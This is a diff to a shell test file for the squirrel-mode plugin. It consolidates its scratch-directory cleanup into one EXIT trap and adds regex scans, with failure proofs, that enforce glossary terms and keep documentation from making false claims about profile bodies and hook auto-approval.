@@ -26,22 +26,55 @@ if ! git -C "$repo_root" rev-parse --is-inside-work-tree >/dev/null 2>&1; then
   exit 1
 fi
 
+# --- Cleanup ----------------------------------------------------------
+#
+# ONE list, ONE EXIT trap, declared here before the first scratch
+# directory is created. This file used to give each scratch directory its
+# own `trap ... EXIT`, and `trap` REPLACES the previous handler in POSIX
+# sh rather than stacking with it: the second declaration silently
+# disinherited $z1_scratch, which was then never removed on any run. Two
+# comments further down this file described that as pre-existing residue
+# and worked around it by reusing an already-trapped directory; both now
+# describe this list instead.
+#
+# Every scratch path in this file is created at the TOP LEVEL, so
+# appending here is enough - no helper here builds one inside a `$( )`
+# subshell, which is the failure tests/test_hoard.sh, tests/test_hooks.sh
+# and tests/test_skills.sh each had to close with a registered parent
+# directory. The SCRATCH-LEAK assertion at the bottom of this file is
+# what keeps that true.
+cleanup_paths=""
+trap 'rm -rf $cleanup_paths' EXIT
+
+scratch_before=$(scratch_snapshot)
+
 # --- Known, documented exclusions ------------------------------------
 #
-# 1) There are now FOUR word-content scans below — visibility claims,
-#    TODO/FIXME/XXX markers, the glossary-avoid-term scan, and the
-#    /plugin+/clear same-sentence scan — and all four skip everything
+# 1) There are now FIVE word-content scans below — visibility claims,
+#    TODO/FIXME/XXX markers, the glossary-avoid-term scan, the
+#    /plugin+/clear same-sentence scan, and the profile-is-verbatim scan
+#    (PROFILE_VERBATIM_REGEX) — and FOUR of the five skip everything
 #    under `tests/` (via the single `continue` in the main loop, right
 #    before the visibility-scan case statement). Without this, the
 #    assertion messages and comments in THIS file — which necessarily
 #    name the very markers/phrases/terms they check for, to describe
 #    what the checks do — would trip the checks they implement. This is
-#    a self-reference problem specific to these four content scans (this
+#    a self-reference problem specific to these content scans (this
 #    comment block itself was stale at "the two WORD-CONTENT scans" for
 #    a while after the third and fourth were added — fixed in S9's
-#    sweep; if a fifth word-content scan is ever added here, update this
-#    count again rather than letting it drift a second time). It does
-#    NOT apply to the executable-bit or JSON-validity checks below:
+#    sweep; the count is now five, and if a sixth is ever added here,
+#    update this again rather than letting it drift a third time).
+#
+#    THE FIFTH SCAN IS THE EXCEPTION, and deliberately so: the
+#    profile-is-verbatim scan runs over `tests/` too, because the
+#    instance that made it necessary was IN `tests/test_hooks.sh` — an
+#    assertion MESSAGE, not a comment. A scan that skipped `tests/`
+#    could not have caught its own reason for existing. It carries the
+#    narrowest self-reference carve-out that leaves it able to do that:
+#    this ONE file, which has to spell the banned phrasing to check for
+#    it. The residual is stated where the scan is: a reintroduction
+#    inside THIS file is not caught, and nothing but review covers that.
+#    It does NOT apply to the executable-bit or JSON-validity checks below:
 #    those have no self-reference problem, so they run over every
 #    tracked file, `tests/` included (that gap previously let a missing
 #    +x bit on the test runner itself go undetected).
@@ -101,7 +134,36 @@ fi
 #         exclusion" section disclosed only the visibility-scan exemption, never this one — an
 #         undisclosed scope change the document's own stated promise (report every scope change
 #         plainly) does not allow. Deleted outright rather than narrowed, since there was nothing to
-#         narrow to. `.sh` files are excluded structurally (not by denylist) because this project's
+#         narrow to.
+#         [Hoard docs fix] docs/specs/* and docs/plans/* ARE on this denylist, for the GLOSSARY scan
+#         only, and the difference from the ACCEPTANCE.md case above is the whole justification: this
+#         exemption protects against real hits, not against none. Both files carry a copy of the
+#         glossary's own `_Avoid_` vocabulary — docs/specs/2026-08-13-hoard-design.md §3's naming
+#         table, whose last column IS an avoid list, and docs/plans/2026-08-13-hoard-phase-1.md's
+#         task text specifying what CONTEXT.md's entries should say — so they trip on the avoided
+#         term for the same reason CONTEXT.md does: they are quoting the rule, not breaking it. They
+#         are also the same CATEGORY the denylist already names (internal design records, like
+#         PLAN.md and docs/adr/*), not a new one invented to make a term pass.
+#         WHAT IT GIVES UP, stated because an exemption that does not say so is the half-true
+#         guarantee this file exists to stop: those two files, both still edited, are no longer
+#         scanned for ANY of the terms in GLOSSARY_AVOID_REGEX, not just the
+#         two that made the exemption necessary. How much text that is:
+#           `glossary-denylist-lines docs/specs/2026-08-13-hoard-design.md: 631`
+#           `glossary-denylist-lines docs/plans/2026-08-13-hoard-phase-1.md: 1986`
+#         (The spec figure shipped as 579 — the size that file had BEFORE the 38 lines the same
+#         commit added to it. Both are re-derived by the GLOSSARY-COST scenario at the bottom of
+#         this file now, so neither can drift again without saying so.) Measured before it shipped:
+#         `grep -cwiE` with the
+#         pre-fix regex returns 0 on both, so nothing was being caught today; what is given up is
+#         future coverage, not present coverage. It is deliberately NOT extended to the visibility
+#         scan's denylist a few lines below, which keeps both files in scope — they have zero
+#         visibility hits, so exempting them there would be an exemption protecting nothing, which
+#         is exactly what the deleted ACCEPTANCE.md precedent forbids. The two lists diverging is
+#         the point, not an oversight.
+#         The exemption is also self-enforcing in one direction: delete it and the real scan reddens
+#         immediately on those two files' avoid lines, so it cannot rot into a line nobody can
+#         explain.
+#         `.sh` files are excluded structurally (not by denylist) because this project's
 #         own shell
 #         comments use several of these same English words as ordinary engineering jargon ("host
 #         detection" in targets/*/install.sh, "the host lacks a hook" in scripts/build.sh) with no
@@ -131,6 +193,59 @@ fi
 #           - "instructions" (Base rules) — collides with `keep-coding-instructions` (the literal,
 #             correct output-style frontmatter key) and ordinary phrases like "chunking
 #             instructions" in docs/RESEARCH.md.
+#         [Hoard docs fix] CONTEXT.md's three hoard entries (hoard / Memory / Layer) added SEVEN
+#         avoid-terms, and none of them was in this regex — which is exactly the gap the comment at
+#         the end of this block forbids leaving open. All seven were run through the check this
+#         comment records, with the scan's own scope and flags (`grep -nwiE`, `*.md`/`*.mdc`, tests/
+#         skipped, this denylist applied). Two passed and are now in the regex; five collide and
+#         stay out, each with its cost written down here in the same form as the entries above.
+#         [Count fix] EVERY FIGURE IN THE FIVE BULLETS BELOW IS RE-DERIVED ON EVERY RUN and compared
+#         against what is written here, by the GLOSSARY-COST scenario at the bottom of this file.
+#         The shape it reads is `glossary-cost <term>: <hits> hits across <files> in-scope files`,
+#         and the scope it recounts in is not a copy of the rules above — it is the very list of
+#         files the scan loop below put in `glossary_scope_files` as it ran, so the two cannot
+#         disagree about what "in scope" means. This is not decoration: four of the five bullets
+#         shipped counts measured BEFORE docs/specs/* and docs/plans/* joined the denylist a few
+#         lines up, in the same commit that added them, under a comment claiming "this denylist
+#         applied"; the fifth ("fact": 22) matched no reading of the repo at all. A number nobody
+#         rechecks rots, and these rotted inside their own commit.
+#           - "memory bank", "knowledge base" (hoard) — PASS, and now enforced. Every occurrence of
+#             either phrase in tracked markdown is the avoid list itself being quoted, in CONTEXT.md
+#             (the glossary), in docs/specs/2026-08-13-hoard-design.md §3's naming table and in
+#             docs/plans/2026-08-13-hoard-phase-1.md's task text — all three denylisted for this
+#             scan (see 4a above, which states what that costs). Nowhere else in the repo produces
+#             either phrase; two-word phrases specific enough that ordinary prose has no reason to.
+#             The GLOSSARY-COST scenario pins that set of three, by file and line, so "nowhere else"
+#             is a check rather than a memory.
+#           - "note" (Memory) — glossary-cost note: 26 hits across 10 in-scope files. Ordinary
+#             English, and none of them is a memory being called a note: README.md's "see the note
+#             at the end of this section", skills/digest/SKILL.md's "a rambling ticket, email,
+#             pasted note" (the digest command's own shipped subject list), and 14 lines of
+#             docs/ACCEPTANCE.md using the ordinary word. NOT CAUGHT, therefore: a document that
+#             calls a hoard memory "a note".
+#           - "entry" (Memory) — glossary-cost entry: 21 hits across 4 in-scope files, and the
+#             collisions are this project's own vocabulary for other things entirely:
+#             skills/pickup/SKILL.md's "Done log entries" / "drop an entry that repeats one you
+#             already have" (shipped, correct, about the checkpoint), and docs/RESEARCH.md's
+#             citation entries. NOT CAUGHT: "entry" used for a memory.
+#           - "fact" (Memory) — glossary-cost fact: 9 hits across 3 in-scope files, and the decisive
+#             ones are shipped skill text: skills/stash/SKILL.md's `reference` type is DEFINED as "A
+#             fact, a state, or a pointer", and its "When a fact changed, supersede instead of
+#             editing" heading is the supersede rule's own name. Banning the word would fail on the
+#             file that teaches it. NOT CAUGHT: "fact" used as a synonym for the memory rather than
+#             for what it records.
+#           - "record" (Memory) — glossary-cost record: 32 hits across 8 in-scope files, the worst
+#             of the five, because it is a VERB in shipped product text: skills/stash/SKILL.md's
+#             frontmatter description opens "Record one durable memory", and rules/base-rules.md
+#             (plus every artifact scripts/build.sh generates from it — output-styles/,
+#             targets/codex/AGENTS.md, targets/cursor/*.mdc) says "a checkpoint, a plan, or any
+#             other record". NOT CAUGHT: "record" used as a noun for a memory.
+#           - "namespace" (Layer) — glossary-cost namespace: 2 hits across 2 in-scope files, and
+#             both are a true statement about a real product surface, not a synonym for a hoard
+#             layer: README.md and docs/OTHER-TOOLS.md each say "Cursor has no command namespace",
+#             which is why the Cursor skills are named `squirrel-digest` rather than
+#             `/squirrel:digest`. Same shape as the "/config" collision recorded above. NOT CAUGHT:
+#             "namespace" used for `global` or `projects/<slug>`.
 #         GLOSSARY_AVOID_REGEX below lists exactly the terms that were checked, by hand, against
 #         every in-scope file before this fix shipped, and found to have zero legitimate collision —
 #         mostly multi-word phrases ("formatting rules", "session file", "drift detection", ...)
@@ -282,6 +397,62 @@ PIN_SKILLS_ON_HARDOFF='The hard off is `/plugin disable squirrel@squirrel-mode`,
 # directory prefix, not as part of a blanket docs/* exclusion — files
 # like docs/RESEARCH.md and docs/OTHER-TOOLS.md are user-facing and
 # stay in scope.
+#
+# WHAT THE docs/adr/ PREFIX GIVES UP FOR THE GLOSSARY SCAN, COUNTED
+# RATHER THAN LEFT AS A CATEGORY. A category comment says why a class is
+# exempt; it does not say what the exemption is letting through, and this
+# repo's rule is that an exemption has to say what it gives up. Counted
+# against the real files with the scan's own `grep -nwiE`, the prefix is
+# NOT empty — SIX lines in three ADRs match GLOSSARY_AVOID_REGEX today.
+#
+# [Count fix] The list below is no longer maintained by hand. Each entry
+# carries an `adr-glossary-hit <path>:<line>` tag, and the GLOSSARY-COST
+# scenario at the bottom of this file re-runs the grep and compares the
+# two sets exactly — a hit here that the grep does not produce, or a hit
+# the grep produces that is not here, fails and names it. It also checks
+# each cited line still contains the phrase quoted for it. Both halves
+# were needed: the list shipped saying "five lines" when the grep found
+# six (the `client` entry below was never declared at all), and its one
+# line-number citation pointed 136 lines above the sentence it quoted,
+# because the ADR grew after the citation was written.
+#   - `adr-glossary-hit docs/adr/0008-hoard-auto-allow.md:221` — "the
+#     skill's own instruction not to write one is the only thing in front
+#     of it". `the skill` is in the regex. Defensible: that paragraph is
+#     reasoning about one specific skill file (skills/stash/SKILL.md) and
+#     its point is that an instruction is not enforcement — it is not
+#     standing in for the base rules, which is what CONTEXT.md reserves
+#     the phrase against.
+#   - `adr-glossary-hit docs/adr/0005-session-flag-off-switch.md:5`,
+#     `adr-glossary-hit docs/adr/0005-session-flag-off-switch.md:49`,
+#     `adr-glossary-hit docs/adr/0005-session-flag-off-switch.md:62` —
+#     three more `the skill`, all of them about `/squirrel:off`'s own
+#     skill file. Same shape, same judgement.
+#   - `adr-glossary-hit docs/adr/0008-hoard-auto-allow.md:240` — "Google
+#     OAuth client secrets", in the list of token families the secret
+#     scanner has no arm for. `client` is in the regex because
+#     CONTEXT.md's Target entry reserves it, and this is not that word at
+#     all: it is the literal, correct name of a Google credential type.
+#     An ordinary-English collision of exactly the kind exclusion 4b
+#     records for "note" and "record" — which is why it needs saying, not
+#     why it can be left unsaid: it went undeclared for the whole life of
+#     this comment, and an exemption list that quietly omits one of its
+#     own entries is the half-true guarantee this file exists to stop.
+#   - `adr-glossary-hit docs/adr/0004-tiered-parity-across-targets.md:3` —
+#     "each gets the deepest integration its host actually supports".
+#     This one is NOT defensible on the same grounds: `host` is exactly
+#     the word CONTEXT.md's Target entry reserves, and this is the
+#     reserved word standing where the canonical name belongs — the same
+#     defect as the README.md regression this whole scan was written
+#     against. It is inside the exemption, so the scan is silent about
+#     it. Left standing rather than corrected here because ADR-0004
+#     belongs to the trail this file only measures, and a test file is
+#     the wrong place to rewrite a decision record from.
+# So the honest statement of the giveaway is not "an ADR might one day
+# drift": one already has, the exemption is why nothing says so, and the
+# cost of keeping it is that the ADR trail is checked by review alone.
+# These are counts against what those files say today, not a permanent
+# property — and the GLOSSARY-COST scenario re-runs the grep for you,
+# rather than trusting anyone to remember to.
 
 # GLOSSARY_AVOID_REGEX — [U6 fix] the hand-picked, hand-collision-checked subset of CONTEXT.md's
 # `_Avoid_` vocabulary this scan actually enforces (see exclusion 4 above for exactly which terms
@@ -289,14 +460,107 @@ PIN_SKILLS_ON_HARDOFF='The hard off is `/plugin disable squirrel@squirrel-mode`,
 # multi-word, at both ends by a non-word character or string boundary — "host" cannot match inside
 # "hosted" or "hostile", and "squirrel mode" (a literal space) cannot match "squirrel-mode" (a
 # literal hyphen) regardless of -w, since the two are different characters to begin with.
-GLOSSARY_AVOID_REGEX="host|platform|client|IDE|formatting rules|style rules|the skill|state file|session file|context file|changelog|completed tasks|backlog|icebox|drift detection|focus check|nag|onboarding|wizard|plugin name|package name|squirrel mode"
+#
+# [Hoard docs fix] `memory bank` and `knowledge base` are the two terms CONTEXT.md's hoard entry
+# added that survive the by-hand collision check — see exclusion 4b above for all seven that were
+# checked and the cost of the five that stay out, and 4a for what denylisting the two files that
+# quote the avoid list gives up.
+GLOSSARY_AVOID_REGEX="host|platform|client|IDE|formatting rules|style rules|the skill|state file|session file|context file|changelog|completed tasks|backlog|icebox|drift detection|focus check|nag|onboarding|wizard|plugin name|package name|squirrel mode|memory bank|knowledge base"
+
+# PROFILE_VERBATIM_REGEX — no tracked file may assert that the quoted
+# profile body can spell any line squirrel-mode injects.
+#
+# WHY A GUARD RATHER THAN CARE. Task 7b made that premise false:
+# `neutralise_forged_lines` in scripts/load-profile.sh marks any line of
+# the quoted profile body that begins with one of squirrel-mode's own
+# injected prefixes, so such a line no longer reaches the model beginning
+# that way. The premise had been written into rationale comments all over
+# the repo, including the rationale of the very guards it justified. THREE
+# separate manual sweeps each reported themselves complete and each missed
+# an instance: the original change said such comments "were corrected
+# where they are now false" and left two; the next sweep found a third,
+# extended to tests/, and declared the class closed while this file's own
+# first run found two more - one an assertion MESSAGE in tests/test_hooks.sh
+# (the sweep before it had filtered to comment lines only) and one in
+# docs/adr/0002-checkpoint-auto-allow.md. A human cannot be trusted to
+# find the last instance of a phrase; that is what a scan is for. This
+# comment says why rather than only what, so the next person to find it
+# inconvenient knows what it replaced.
+#
+# WHAT IT MATCHES, AND WHY THAT IS NARROW ENOUGH TO BE HONEST. Only the
+# UNQUALIFIED, present-tense assertion. The corrected form in this repo is
+# "COULD otherwise spell", which states the same fact as a hypothetical
+# the neutralisation closes, and it deliberately does NOT match: the word
+# before "spell" is what separates a live claim from a counterfactual.
+# Nor does "a profile body can spell one", of a token VALUE - a profile
+# genuinely still can spell any token it likes, which is exactly why
+# checkpoint_file_lines derives its token from the session_id rather than
+# trusting the body, so barring that sentence would bar a true statement.
+# Both of those pass today and are asserted to keep passing below.
+#
+# WHAT IT DOES NOT CATCH, stated rather than implied: a reworded assertion
+# ("free to write whatever line it pleases") escapes it, exactly as
+# MARKER_REGEX cannot catch a marker spelled some new way. A phrase scan
+# bounds a class of recurrences; it does not decide what a sentence means.
+# It is here because the recurrences were LITERAL - the same handful of
+# words, copied from one rationale to the next - which is the shape a
+# phrase scan does close.
+PROFILE_VERBATIM_REGEX="(can|may|is free to|are free to) spell any line|(is|are) free to hold a line spelled|body (is|are) verbatim"
+
+# BASH_ANY_HOOK_REGEX - no tracked file may say that NO hook, or no hook AT
+# ALL, can auto-approve a `Bash` call.
+#
+# The claim is false about Claude Code and this repo's own ADR-0002 says so
+# in as many words: "Auto-approving `Bash` would mean returning
+# permissionDecision: "allow" for a tool whose argument is an arbitrary
+# command string" - possible, weighed, and REFUSED. A `PreToolUse` hook may
+# match `Bash` and may answer `allow`. What is true is narrower and is the
+# whole point: squirrel-mode registers its own `PreToolUse` hook for
+# `Write|Edit|Read` and nothing else, so no hook OF THIS PLUGIN'S ever runs
+# on a `Bash` call. That is a choice of configuration, and every prompt
+# count in the docs follows from the choice rather than from a limit of the
+# tool.
+#
+# WHY A SCAN AND NOT A SWEEP. The false form was corrected in README.md,
+# docs/OTHER-TOOLS.md and docs/ACCEPTANCE.md, and NINE copies survived that
+# correction - one of them skills/dig/SKILL.md, i.e. text the model reads at
+# run time, and two of them assertion MESSAGES, which no docs-only sweep
+# looks at. The recurrences are literal - the same handful of words copied
+# from one rationale into the next - which is the shape a phrase scan does
+# close. It does not decide what a sentence means; it bounds a class of
+# recurrence.
+#
+# WHAT IT DELIBERATELY DOES NOT MATCH, because these are true and must stay
+# sayable: a claim about a NAMED script ("scripts/allow-checkpoint.sh can
+# never auto-approve a Bash call" - true of that script, which only ever
+# sees Write/Edit/Read), and a claim scoped to this plugin ("this plugin's
+# hook is never invoked for a `Bash` call and cannot auto-approve one, at
+# any path"). The negative half below asserts all four live keep-sites pass,
+# because a guard that also bars the correct wording is one this repo
+# deletes rather than ships.
+#
+# Scanned over EVERY tracked file, tests/ included and with no path
+# denylist, for the reason PROFILE_VERBATIM_REGEX gives for itself: the
+# copies lived in tests/, in docs/plans/* and in docs/adr/* - three places
+# the other scans' denylists exempt. THE ONE CARVE-OUT is this file, which
+# must spell the banned phrasing to check for it.
+BASH_ANY_HOOK_REGEX="no hook (can|could|may|will|would)( ever)? auto-approve|by any hook|any hook can( ever)? auto-approve|hooks (can ?not|can never|cannot) auto-approve"
 
 visibility_hits=""
+profile_verbatim_hits=""
+bash_any_hook_hits=""
 marker_hits=""
 non_exec_hits=""
 invalid_json_hits=""
 glossary_avoid_hits=""
 same_sentence_hits=""
+# The files the glossary scan actually looked at, captured AS IT RAN.
+# The GLOSSARY-COST scenario at the bottom recounts exclusion 4b's five
+# published per-term costs over this exact list rather than re-deriving
+# the scope from the rules in the comments - a second copy of the scope
+# is a second thing to keep in step, and the counts it published were
+# wrong precisely because the denylist moved and they did not.
+glossary_scope_files=""
 
 for f in $(git -C "$repo_root" ls-files); do
   # Executable-bit and JSON-validity: every tracked file, no exclusions.
@@ -312,6 +576,53 @@ for f in $(git -C "$repo_root" ls-files); do
     *.json)
       if ! jq empty "$repo_root/$f" >/dev/null 2>&1; then
         invalid_json_hits="$invalid_json_hits $f"
+      fi
+      ;;
+  esac
+
+  # PROFILE-IS-VERBATIM scan: EVERY tracked file, tests/ included, and
+  # with NO path denylist. Placed here, ABOVE the tests/* `continue`, on
+  # purpose - see exclusion 1: the instance that made this scan necessary
+  # was an assertion MESSAGE in tests/test_hooks.sh, so a scan sitting
+  # below that `continue` could not catch its own reason for existing.
+  #
+  # It also deliberately does not reuse the PLAN.md/docs/adr/CONTEXT.md
+  # path denylist the visibility and glossary scans use, for the reason
+  # PLUGIN_CLEAR_SAME_SENTENCE_REGEX already records for itself: a real
+  # occurrence of this defect lived INSIDE that denylist
+  # (docs/adr/0002-checkpoint-auto-allow.md), so reusing it would exempt
+  # precisely the file that carried the bug. An ADR is the worst place to
+  # leave the premise standing, not the safest - it is what the next task
+  # reasons from, which is how Task 7 came to ship a rule whose premise
+  # hooks/hooks.json had already falsified.
+  #
+  # THE ONE CARVE-OUT is this file, which must spell the banned phrasing
+  # to check for it. Residual, stated: a reintroduction inside
+  # tests/test_repo_invariants.sh itself is not caught by anything but
+  # review. Writing the regex in split literals to dodge even that was
+  # considered and rejected - it would make the guard depend on nobody
+  # ever re-joining a string, and it reads as a trick rather than a rule.
+  case "$f" in
+    tests/test_repo_invariants.sh)
+      ;;
+    *)
+      if grep -qwiE "$PROFILE_VERBATIM_REGEX" "$repo_root/$f" 2>/dev/null; then
+        profile_verbatim_hits="$profile_verbatim_hits $f"
+      fi
+      ;;
+  esac
+
+  # NO-HOOK-CAN-AUTO-APPROVE-BASH scan: same placement, same scope and the
+  # same single carve-out as the scan above, for the same reasons - see
+  # BASH_ANY_HOOK_REGEX. Above the tests/* `continue` because two of the nine
+  # surviving copies were assertion messages in tests/, and with no path
+  # denylist because four more were in docs/plans/* and docs/adr/*.
+  case "$f" in
+    tests/test_repo_invariants.sh)
+      ;;
+    *)
+      if grep -qiE "$BASH_ANY_HOOK_REGEX" "$repo_root/$f" 2>/dev/null; then
+        bash_any_hook_hits="$bash_any_hook_hits $f"
       fi
       ;;
   esac
@@ -378,12 +689,20 @@ for f in $(git -C "$repo_root" ls-files); do
   # base rules. WHAT THIS GIVES UP: that file is no longer scanned for any reserved term at all, so
   # a genuine misuse inside it will not be caught here. Accepted because it plans commands rather
   # than shipping them; if it ever becomes user-facing guidance, take it back off this list.
+  #
+  # [Hoard docs fix] docs/specs/* and docs/plans/* are on THIS denylist and NOT on the visibility
+  # scan's a few lines above, and the divergence is deliberate: they carry a copy of the glossary's
+  # own `_Avoid_` vocabulary (a naming table and the task text that specified it), which is the
+  # CONTEXT.md situation exactly, and they have zero visibility hits, which is the ACCEPTANCE.md
+  # situation exactly. Exempting them here protects against something real; exempting them there
+  # would protect against nothing. Exclusion 4a above states what this one costs.
   case "$f" in
     *.md | *.mdc)
       case "$f" in
-        PLAN.md | docs/adr/* | CONTEXT.md | .build-checkpoint.md | docs/SKILLS-ADAPTATION.md)
+        PLAN.md | docs/adr/* | CONTEXT.md | .build-checkpoint.md | docs/SKILLS-ADAPTATION.md | docs/specs/* | docs/plans/*)
           ;;
         *)
+          glossary_scope_files="$glossary_scope_files $f"
           if grep -qwiE "$GLOSSARY_AVOID_REGEX" "$repo_root/$f" 2>/dev/null; then
             glossary_avoid_hits="$glossary_avoid_hits $f"
           fi
@@ -411,7 +730,7 @@ assert_eq "" "$visibility_hits" "no tracked file may claim checkpoint writes are
 # OLD per-line exemption inspected was ever the full claim) and a single-line variant of the
 # identical claim, proving the fix is not merely reacting to the specific shape of a line break.
 z1_scratch=$(mktemp -d "${TMPDIR:-/tmp}/squirrel-z1-test.XXXXXX")
-trap 'rm -rf "$z1_scratch"' EXIT
+cleanup_paths="$cleanup_paths $z1_scratch"
 
 z1_threeline_fixture="$z1_scratch/ACCEPTANCE_threeline.md"
 cp "$repo_root/docs/ACCEPTANCE.md" "$z1_threeline_fixture"
@@ -467,7 +786,7 @@ assert_exit_code 0 git -C "$repo_root" ls-files --error-unmatch .shellcheckrc
 assert_eq "" "$glossary_avoid_hits" "no tracked user-facing markdown-family file may use a reserved _Avoid_ term from CONTEXT.md's glossary (see GLOSSARY_AVOID_REGEX, above) in place of its canonical name"
 
 glossary_avoid_scratch=$(mktemp -d "${TMPDIR:-/tmp}/squirrel-glossary-avoid-test.XXXXXX")
-trap 'rm -rf "$glossary_avoid_scratch"' EXIT
+cleanup_paths="$cleanup_paths $glossary_avoid_scratch"
 glossary_avoid_fixture="$glossary_avoid_scratch/bad_glossary_term.md"
 printf '# Sample doc\n\nThe installers write to the host directories listed above.\n' >"$glossary_avoid_fixture"
 if grep -qwiE "$GLOSSARY_AVOID_REGEX" "$glossary_avoid_fixture" 2>/dev/null; then
@@ -500,6 +819,190 @@ else
   y1_glossary_caught=no
 fi
 assert_eq "yes" "$y1_glossary_caught" "FAILURE PROOF (invariant 7, Y1): with docs/ACCEPTANCE.md's glossary-scan exemption deleted, appending 'The installers write only to the host directories listed above.' to it must be caught"
+
+# [Hoard docs fix] FAILURE PROOFS for the two terms CONTEXT.md's hoard entry added and this fix
+# enforces. Each is appended to a copy of a REAL in-scope file (README.md, whose privacy section is
+# where a memory would most plausibly be miscalled), not to a hand-written fixture, and each mutant
+# is `cmp`-checked first: an append that produced a byte-identical file would leave a proof that
+# reports clean while proving nothing.
+for glossary_new_term in "memory bank" "knowledge base"; do
+  glossary_new_fixture="$glossary_avoid_scratch/README_$(printf '%s' "$glossary_new_term" | tr ' ' '_').md"
+  cp "$repo_root/README.md" "$glossary_new_fixture"
+  printf '\nThe hoard is squirrel-mode'"'"'s %s, and it is read in every future session.\n' "$glossary_new_term" >>"$glossary_new_fixture"
+  if cmp -s "$repo_root/README.md" "$glossary_new_fixture"; then
+    glossary_new_differs=no
+  else
+    glossary_new_differs=yes
+  fi
+  assert_eq "yes" "$glossary_new_differs" "FAILURE PROOF (invariant 7, '$glossary_new_term'), control: the mutant must genuinely differ from README.md"
+  if grep -qwiE "$GLOSSARY_AVOID_REGEX" "$glossary_new_fixture" 2>/dev/null; then
+    glossary_new_caught=yes
+  else
+    glossary_new_caught=no
+  fi
+  assert_eq "yes" "$glossary_new_caught" "FAILURE PROOF (invariant 7): calling the hoard a '$glossary_new_term' in a scratch copy of README.md must be caught — CONTEXT.md's hoard entry reserves both phrases and this scan now enforces them"
+done
+
+# [Hoard docs fix] And the other half of that exemption, asserted rather than asserted-in-a-comment:
+# docs/specs/2026-08-13-hoard-design.md must REALLY match the regex, because its section 3 naming
+# table quotes the avoid list. That is what makes its place on the glossary denylist an exemption
+# protecting something real rather than the empty one docs/ACCEPTANCE.md's used to be — the
+# distinction the exclusion-4a comment draws, kept honest by a check instead of by memory. Delete
+# the denylist entry and the scan reddens here; delete this assertion's subject line from the spec
+# and this assertion reddens instead.
+if grep -qwiE "$GLOSSARY_AVOID_REGEX" "$repo_root/docs/specs/2026-08-13-hoard-design.md" 2>/dev/null; then
+  spec_quotes_avoid_list=yes
+else
+  spec_quotes_avoid_list=no
+fi
+assert_eq "yes" "$spec_quotes_avoid_list" "docs/specs/2026-08-13-hoard-design.md must still contain the avoid-list terms its section 3 naming table quotes — that is the whole justification for its glossary-scan exemption, and an exemption protecting nothing is the one this file already deleted once"
+
+# 7b. No tracked file may assert that the quoted profile body can spell any line squirrel-mode
+#     injects. See PROFILE_VERBATIM_REGEX above for why this is a scan and not a sweep - the
+#     premise was falsified by neutralise_forged_lines, and three manual sweeps each reported
+#     themselves complete while missing an instance. Scanned over EVERY tracked file, tests/
+#     included and with no path denylist, because the two instances this scan found on its first
+#     run were an assertion MESSAGE in tests/test_hooks.sh and a paragraph in docs/adr/0002 -
+#     one in a directory the other scans skip entirely, one in a directory their path denylist
+#     exempts.
+assert_eq "" "$profile_verbatim_hits" "no tracked file may assert that the quoted profile body can spell any line squirrel-mode injects - that premise was falsified by neutralise_forged_lines in scripts/load-profile.sh; state it as a counterfactual (\"COULD otherwise spell\") and say what closes it, the way scripts/load-profile.sh and docs/adr/0002 now do"
+
+# FAILURE PROOF (invariant 7b): the exact phrasing this scan was written against, reintroduced into
+# a scratch copy of a REAL tracked file, must be caught. The fixture is a copy of
+# scripts/load-profile.sh with its corrected counterfactual reverted to the assertion it replaced -
+# not a hand-written sentence - so this proves the scan catches the regression it exists for rather
+# than catching a string invented to be caught.
+#
+# The `diff` is asserted, not assumed: eight variants of the transform-matches-nothing trap have
+# been found in this plan, two of them inside probes, and a `sed` that matched nothing here would
+# leave the fixture byte-identical to a file the scan correctly passes - a proof that reports clean
+# while proving the opposite of what it claims. Reuses $glossary_avoid_scratch because it is already
+# there and this fixture needs nothing of its own; a fresh `mktemp -d` appended to $cleanup_paths
+# would be equally safe now that this file has one trap and one list (see the cleanup header at the
+# top). It was NOT safe before that: each scratch directory carried its own `trap ... EXIT`, and
+# `trap` REPLACES the previous handler in POSIX sh.
+pv_fixture="$glossary_avoid_scratch/load-profile-verbatim.sh"
+sed 's/block COULD otherwise spell any line it likes/block is verbatim and can spell any line it likes/' \
+  "$repo_root/scripts/load-profile.sh" >"$pv_fixture"
+if cmp -s "$repo_root/scripts/load-profile.sh" "$pv_fixture"; then
+  pv_fixture_differs=no
+else
+  pv_fixture_differs=yes
+fi
+assert_eq "yes" "$pv_fixture_differs" "FAILURE PROOF (invariant 7b), control: the mutation must genuinely change the file - a sed that matched nothing would leave a byte-identical copy, which the scan correctly passes, and this proof would then report clean while testing nothing at all"
+if grep -qwiE "$PROFILE_VERBATIM_REGEX" "$pv_fixture" 2>/dev/null; then
+  pv_fixture_caught=yes
+else
+  pv_fixture_caught=no
+fi
+assert_eq "yes" "$pv_fixture_caught" "FAILURE PROOF (invariant 7b): reverting scripts/load-profile.sh's counterfactual back to 'is verbatim and can spell any line it likes' in a scratch copy must be caught by PROFILE_VERBATIM_REGEX"
+
+# THE NEGATIVE HALF - without it this guard could be one that bars correct work. Three wordings
+# that must all pass: the counterfactual the repo now uses; the statement that a profile can spell
+# a token VALUE, which is TRUE (nothing stops a profile naming any token, which is precisely why
+# checkpoint_file_lines derives its own from the session_id) and is the live wording at
+# tests/test_hooks.sh's checkpoint_list_marker helper; and the past-tense form describing the
+# defect as history.
+pv_safe_fixture="$glossary_avoid_scratch/profile_verbatim_safe.md"
+{
+  printf '# Sample doc\n\n'
+  printf 'The profile body quoted above this block COULD otherwise spell any line it likes.\n'
+  printf 'A header carrying any other token - a profile body can spell one - is not this hook.\n'
+  printf 'Before that change a profile was free to hold a line spelled like one of them.\n'
+} >"$pv_safe_fixture"
+if grep -qwiE "$PROFILE_VERBATIM_REGEX" "$pv_safe_fixture" 2>/dev/null; then
+  pv_safe_caught=yes
+else
+  pv_safe_caught=no
+fi
+assert_eq "no" "$pv_safe_caught" "sanity check (invariant 7b): the counterfactual 'COULD otherwise spell', the TRUE statement that a profile can spell a token VALUE, and the past-tense 'was free to hold' must all pass - a guard that flagged any of these would be barring correct statements, which is worse than the manual sweep it replaces"
+
+# And the same negative half against the REAL file that carries the token-value wording, so this
+# rests on the shipped text rather than only on a fixture that paraphrases it.
+if grep -qwiE "$PROFILE_VERBATIM_REGEX" "$repo_root/tests/test_hooks.sh" 2>/dev/null; then
+  pv_hooks_caught=yes
+else
+  pv_hooks_caught=no
+fi
+assert_eq "no" "$pv_hooks_caught" "sanity check (invariant 7b): tests/test_hooks.sh must pass this scan as it actually stands - it is in scope (no tests/ skip for this one scan) and it contains the legitimate 'a profile body can spell one' wording about a token value"
+
+# 7c. No tracked file may claim that NO hook can auto-approve a `Bash` call. See
